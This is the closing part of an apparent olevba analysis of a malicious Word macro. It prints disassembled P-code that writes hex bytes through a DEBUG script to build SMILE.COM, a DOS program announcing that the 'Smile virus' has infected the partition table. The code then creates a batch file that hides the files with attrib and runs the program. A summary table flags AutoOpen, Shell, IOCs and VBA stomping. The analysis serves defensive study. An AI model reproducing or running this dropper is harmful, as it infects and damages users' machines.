' 	LitStr 0x0036 "E 12E0 DE 04 A6 FB 13 20 1F EC 8C EC CC 6C CC 99 14 D9"
' 	PrintItemNL 
' Line #609:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12F0 99 19 B3 20 76 F9 A6 DB 20 17 6C 92 6C C8 6F E6"
' 	PrintItemNL 
' Line #610:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1300 46 EC C3 3F 24 47 C9 99 3B 24 DB B2 6E EC 82 5D"
' 	PrintItemNL 
' Line #611:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1310 C2 66 F9 20 CF E4 42 7B 92 3B 33 26 99 32 DB 64"
' 	PrintItemNL 
' Line #612:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1320 FB 99 9D 9A 64 63 36 6C C3 32 79 B6 D9 A6 7D 32"
' 	PrintItemNL 
' Line #613:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1330 4F 36 49 B2 CC D6 6C 93 33 21 93 6C C8 9B B1 25"
' 	PrintItemNL 
' Line #614:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1340 B3 66 03 ED 8C 9A 88 9B F6 44 FF EC 89 13 3F CC"
' 	PrintItemNL 
' Line #615:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1350 99 BF 90 13 FE 40 4F FC 04 FF 80 3F F0 07 FF 13"
' 	PrintItemNL 
' Line #616:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1360 77 E9 13 33 22 37 78 02 6E C9 3F DC 8B E6 62 7F"
' 	PrintItemNL 
' Line #617:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1370 8C 66 F3 C9 9B D8 07 F3 13 7C CC 89 BE 03 F6 73"
' 	PrintItemNL 
' Line #618:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1380 33 26 64 DB 60 3B 3E 44 9B C8 9F EC C9 B2 64 49"
' 	PrintItemNL 
' Line #619:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1390 33 13 99 8C 9B 31 13 EC 83 7F F1 03 FC CD DE 19"
' 	PrintItemNL 
' Line #620:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13A0 99 FF 91 3E 03 66 4C D9 1F CC 1F 99 BF 70 3F B1"
' 	PrintItemNL 
' Line #621:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13B0 BB CC 4C 77 70 1D C4 1B F3 26 CC C7 33 36 4C 9D"
' 	PrintItemNL 
' Line #622:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13C0 E6 4D D9 90 3F E4 4F 64 B2 64 CD 8F EC 19 93 78"
' 	PrintItemNL 
' Line #623:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13D0 81 F8 03 FC 92 DC 84 D8 9D D9 B7 33 23 93 CD 24"
' 	PrintItemNL 
' Line #624:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13E0 D8 19 9B 32 65 93 93 26 C4 69 32 47 C7 1C D8 73"
' 	PrintItemNL 
' Line #625:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13F0 30 CD B3 26 D8 3C B3 61 E6 6D 93 6E 26 79 30 E3"
' 	PrintItemNL 
' Line #626:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1400 40 CC C6 07 0E 6C 4C B8 F0 C3 EF 86 73 37 89 0F"
' 	PrintItemNL 
' Line #627:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1410 B8 26 6C 0C 19 CC 68 F3 61 93 C7 27 98 36 7D 31"
' 	PrintItemNL 
' Line #628:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1420 F3 B3 66 CD CC 9B 36 7E 59 3C D9 66 C3 27 83 4F"
' 	PrintItemNL 
' Line #629:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1430 07 9C 26 79 30 70 D9 E1 9F E3 13 0C 96 43 36 4D"
' 	PrintItemNL 
' Line #630:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1440 BC 99 3C FA 6C 9B 6C 3D C8 86 4F 2E C0 DD 03 FF"
' 	PrintItemNL 
' Line #631:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1450 11 F0 FF F0 3E 0D FE 13 B2 DF 80 CC 27 D1 2C 99"
' 	PrintItemNL 
' Line #632:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1460 E1 B4 1D E1 3C 3F C2 78 3F 01 F8 BC 0F 71 74 1B"
' 	PrintItemNL 
' Line #633:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1470 07 33 CC 73 1E E6 3B 85 F1 3C 07 91 EC CE C3 B8"
' 	PrintItemNL 
' Line #634:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1480 DE 03 89 F2 3C 8C 63 E4 F1 9F 17 44 D8 F9 0F 11"
' 	PrintItemNL 
' Line #635:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1490 86 C7 41 7E 3F 07 D8 FE 1F E3 E8 3B 8F E2 FE 37"
' 	PrintItemNL 
' Line #636:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14A0 87 F1 BC 65 C7 39 87 C6 70 9F 1F C3 F8 9E 47 F9"
' 	PrintItemNL 
' Line #637:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14B0 C7 91 F0 F8 0F 67 CC 13 8D C3 38 8F 81 FC 07 A7"
' 	PrintItemNL 
' Line #638:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14C0 F1 3D 8C E1 9C 03 88 72 1E 31 CC F0 76 30 C3 1E"
' 	PrintItemNL 
' Line #639:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14D0 47 C0 79 17 01 F8 C6 30 EC 31 9C F1 0C 8F 82 78"
' 	PrintItemNL 
' Line #640:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14E0 FE 0F E2 B8 FB 13 D9 FD 27 9B 62 2D 90 CC 37 9B"
' 	PrintItemNL 
' Line #641:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14F0 71 9F 27 61 F2 BB 06 F4 C3 3C 66 D9 83 26 33 81"
' 	PrintItemNL 
' Line #642:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1500 C4 C6 0C E0 C6 7D 64 93 C9 35 9F 63 3C 1B 61 BC"
' 	PrintItemNL 
' Line #643:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1510 8E 37 80 F1 CC C6 6D 82 19 E5 98 79 93 31 8C 99"
' 	PrintItemNL 
' Line #644:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1520 24 C2 73 18 C6 79 27 98 F3 37 13 C6 7E 19 C9 EC"
' 	PrintItemNL 
' Line #645:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1530 F7 19 C4 78 8D 24 F3 2E 31 98 F2 0C C3 C7 3D 8F"
' 	PrintItemNL 
' Line #646:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1540 88 D9 8E 67 38 CD 81 90 19 87 B9 9C 3F 98 CA 3B"
' 	PrintItemNL 
' Line #647:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1550 87 37 89 E6 7A 6C DC 3D B8 CE 66 3E 66 1F 8E 99"
' 	PrintItemNL 
' Line #648:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1560 E7 D3 CE E1 E7 97 69 F6 C7 F1 F9 8F C3 F6 9F 93"
' 	PrintItemNL 
' Line #649:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1570 DF 8E D1 FB 8F E3 9D 9F 63 CF 19 C7 18 7E 8F E6"
' 	PrintItemNL 
' Line #650:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1580 78 9E 71 DA 3F C7 F0 ED 8E 83 9F 39 E6 78 EE 3F"
' 	PrintItemNL 
' Line #651:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1590 E3 98 E7 8E 73 1E 73 8C F9 E6 75 E3 9C FB 8C E3"
' 	PrintItemNL 
' Line #652:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15A0 BC 77 98 F1 1A 60 CE 61 87 3D C7 9F 39 67 BC 67"
' 	PrintItemNL 
' Line #653:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15B0 18 F1 F8 73 38 E6 06 E3 BC 73 CC 7C 1F 8D C1 D6"
' 	PrintItemNL 
' Line #654:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15C0 73 C6 77 87 31 8E 3C C7 30 73 1C E3 9C 71 8C 71"
' 	PrintItemNL 
' Line #655:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15D0 C6 18 C6 38 73 1A 21 CD CC 83 33 1F 0C CE 3C 33"
' 	PrintItemNL 
' Line #656:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15E0 98 31 CE 63 C7 33 8C CD 8E 3C 33 98 E0 E4 E3 99"
' 	PrintItemNL 
' Line #657:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15F0 31 C6 C6 E3 33 8F 0E 86 36 76 38 98 FC 63 E3 B9"
' 	PrintItemNL 
' Line #658:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1600 CF 8F C6 67 33 8E 9C 9F 1C E0 71 B3 8C E4 CC 27"
' 	PrintItemNL 
' Line #659:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1610 47 71 9C 64 E4 E1 A3 89 CC 9E 67 31 73 0C C1 CC"
' 	PrintItemNL 
' Line #660:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1620 C7 8B CC CC 33 A3 1A 38 CC E1 C6 1B D3 78 FF 2E"
' 	PrintItemNL 
' Line #661:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1630 E1 EF 1F 87 5C 6F 1B 93 9C 72 E5 93 8E 31 CC 67"
' 	PrintItemNL 
' Line #662:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1640 8E 39 9C 98 EC 1C 83 B3 71 C6 20 EE 35 0F 1D F1"
' 	PrintItemNL 
' Line #663:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1650 78 F7 3E 35 19 9E 30 0B 99 36 0F 1C E6 1C F1 DC"
' 	PrintItemNL 
' Line #664:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1660 F1 CE E1 AF 1B 86 66 67 18 F9 DC 66 CC F3 33 33"
' 	PrintItemNL 
' Line #665:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1670 8C CC A6 33 67 39 99 93 67 68 CE 79 CC 63 CC 7B"
' 	PrintItemNL 
' Line #666:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1680 3C 19 26 33 62 DA 7B 16 46 1C DB 2C 93 4C C0 E3"
' 	PrintItemNL 
' Line #667:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1690 C8 31 CD A4 DB 9A 66 17 36 4E 3C DA 64 D8 D2 64"
' 	PrintItemNL 
' Line #668:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16A0 F1 E4 E7 C9 A7 39 8C 36 0F CE 33 2F 23 88 C9 99"
' 	PrintItemNL 
' Line #669:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16B0 23 8C 73 86 3A 73 66 78 EC CC 99 A3 78 C6 33 98"
' 	PrintItemNL 
' Line #670:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16C0 36 CC E1 93 65 C9 33 0D C1 B2 3E 4D C3 34 CF CA"
' 	PrintItemNL 
' Line #671:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16D0 CC 78 C1 8E 6C D1 E3 1C 61 93 13 98 38 E3 8E 5C"
' 	PrintItemNL 
' Line #672:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16E0 F0 C7 1E 30 F1 CF 19 6C 9D 6D C7 9B 1C 61 9B 27"
' 	PrintItemNL 
' Line #673:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 16F0 1C F1 CD 1E 18 E2 C7 1C 31 E1 86 38 E5 9A 6C 61"
' 	PrintItemNL 
' Line #674:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1700 CF 3E 38 E7 0E 7C C8 36 4C E3 9C 38 E3 8F 0C 68"
' 	PrintItemNL 
' Line #675:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1710 E7 1C B3 67 3C F9 E3 87 1C 78 E3 06 18 73 8B 38"
' 	PrintItemNL 
' Line #676:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1720 38 C7 86 38 73 C7 3C 99 CC DE 6C F1 C3 1E 3C 31"
' 	PrintItemNL 
' Line #677:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1730 C7 8E 18 70 E3 86 73 33 9B 1C 71 CD 86 78 F2 63"
' 	PrintItemNL 
' Line #678:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1740 8F 1E 71 9A 2C F9 E7 96 7C 71 F1 9E 19 62 CE 5C"
' 	PrintItemNL 
' Line #679:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1750 B3 E7 8F 38 E3 A6 0C 20 C7 30 69 93 19 9C 6C CC"
' 	PrintItemNL 
' Line #680:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1760 1C 33 27 C6 99 B0 E0 FC D8 67 1E 47 CD 83 01 CC"
' 	PrintItemNL 
' Line #681:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1770 D9 91 72 3C 3E 7D 3C 1F 1E 4C 9E 16 6C D9 19 B0"
' 	PrintItemNL 
' Line #682:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1780 CC 9E 37 89 8C DC 68 E2 CC 69 F1 CC C9 E3 CC C9"
' 	PrintItemNL 
' Line #683:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1790 E3 8C CB C3 9C CF C7 1C C7 C3 8C C7 C3 9C C7 E7"
' 	PrintItemNL 
' Line #684:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17A0 8C C7 C3 9C CF CE 79 9F 26 39 99 8E 79 99 9C F1"
' 	PrintItemNL 
' Line #685:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17B0 91 8C F1 B3 99 F1 B2 CC D1 83 99 E3 26 D9 CD 97"
' 	PrintItemNL 
' Line #686:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17C0 1C C6 67 3B 19 32 4D 99 2E 79 8C 27 31 8C 33 32"
' 	PrintItemNL 
' Line #687:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17D0 66 4C 73 C6 0C 63 9C 63 66 93 F8 CD 9C 77 8E 9C"
' 	PrintItemNL 
' Line #688:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17E0 7E 4C 0C 6E 4D 98 EC C6 38 66 66 78 DC F3 4C CE"
' 	PrintItemNL 
' Line #689:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 17F0 64 98 C6 31 99 98 3C DF 1C BD 37 19 C6 0F 3C 72"
' 	PrintItemNL 
' Line #690:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1800 0E 19 33 CF 32 E3 13 24 43 DF 66 C7 5C 66 83 04"
' 	PrintItemNL 
' Line #691:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1810 64 73 7E EC D6 30 6C 4D BF CC 06 7C FD 98 20 FF"
' 	PrintItemNL 
' Line #692:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1820 88 4E F3 80 7F F0 3B FF 00 3F FC 0F FB C0 1F FE"
' 	PrintItemNL 
' Line #693:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1830 03 FF C0 1F FE 03 FF C0 3F FC 0F 7F 00 7F F0 03"
' 	PrintItemNL 
' Line #694:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1840 10 07 FF F0 20 0F FB FF FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #695:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1850 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #696:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1860 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #697:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1870 FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #698:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1880 4D 5A 73 00 01 00 00 00 00 00 80 00 FF FF 08 00"
' 	PrintItemNL 
' Line #699:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1890 FE 07 00 00 1C 00 00 00 1C 00 00 00 B4 09 0E 1F"
' 	PrintItemNL 
' Line #700:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18A0 BA 2A 00 CD 21 B8 00 4C CD 21 0D 0A 57 41 52 4E"
' 	PrintItemNL 
' Line #701:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18B0 49 4E 47 3A 0D 0A 0D 0A 53 6D 69 6C 65 20 76 69"
' 	PrintItemNL 
' Line #702:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18C0 72 75 73 20 68 61 73 20 6E 6F 77 20 69 6E 66 65"
' 	PrintItemNL 
' Line #703:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18D0 63 74 65 64 20 74 68 65 20 70 61 72 74 69 74 69"
' 	PrintItemNL 
' Line #704:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 18E0 6F 6E 20 74 61 62 6C 65 20 21 21 21 21 21 0D 0A"
' 	PrintItemNL 
' Line #705:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "E 18F0 0D 0A 24"
' 	PrintItemNL 
' Line #706:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "RCX"
' 	PrintItemNL 
' Line #707:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "17F3"
' 	PrintItemNL 
' Line #708:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "W"
' 	PrintItemNL 
' Line #709:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "Q"
' 	PrintItemNL 
' Line #710:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #711:
' 	LitStr 0x0009 "SMILE.COM"
' 	St c$ 
' Line #712:
' Line #713:
' 	Ld B$ 
' 	LitStr 0x0009 "power.bat"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #714:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #715:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "debug <"
' 	Ld B$ 
' 	Add 
' 	LitStr 0x000F "power.scr > nul"
' 	Add 
' 	PrintItemNL 
' Line #716:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #717:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "attrib"
' 	Ld B$ 
' 	Add 
' 	LitStr 0x000A "power.* +h"
' 	Add 
' 	PrintItemNL 
' Line #718:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #719:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld B$ 
' 	Ld c$ 
' 	Add 
' 	PrintItemNL 
' Line #720:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #721:
' Line #722:
' 	Ld B$ 
' 	LitStr 0x0009 "power.bat"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #723:
' Line #724:
' 	LitStr 0x0009 "Installed"
' 	LitStr 0x0003 "Yes"
' 	Ld c$ 
' 	ArgsCall SetProfileString 0x0003 
' Line #725:
' 	ElseBlock 
' Line #726:
' 	GoTo Finish 
' Line #727:
' 	EndIfBlock 
' Line #728:
' Line #729:
' 	Label Finish 
' Line #730:
' 	EndSub 
' Line #731:
' 	Reparse 0x004E "=============================================================================="
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |power.scr           |Executable file name                         |
|IOC       |power.bat           |Executable file name                         |
|Base64    |"{e                 |Intl                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

